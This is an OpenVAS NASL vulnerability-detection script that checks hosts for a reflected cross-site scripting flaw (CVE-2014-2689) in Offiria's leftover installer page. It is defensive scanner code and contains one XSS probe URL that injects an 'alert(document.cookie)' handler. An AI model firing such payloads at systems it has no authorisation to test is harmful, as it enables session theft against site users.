###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_offiria_cross_site_scripting_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Offiria Cross-Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:slashes&dots:offria";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805191");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2014-2689");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-05-27 16:23:32 +0530 (Wed, 27 May 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Offiria Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"The host is running Offiria and is prone
  to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to insufficient sanitization
  of user-supplied data in URI after '/installer/index.php' script is not
  removed from the system by default.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship between
  their browser and the server.");

  script_tag(name:"affected", value:"Offiria version 2.1.1 and probably prior.");

  script_tag(name:"solution", value:"As a workaround remove the vulnerable
  script or restrict access to it via .htaccess file or WAF.");

  script_tag(name:"solution_type", value:"Workaround");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23210");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/532048");
  script_xref(name:"URL", value:"http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-2689.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_offiria_remote_detect.nasl");
  script_mandatory_keys("offiria/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://offiria.com");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!appDir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = appDir + '/installer/index.php/"onmouseover="alert(document.cookie) ;"=">';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"alert\(document.cookie\)", extra_check:">Offiria Installation<"))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
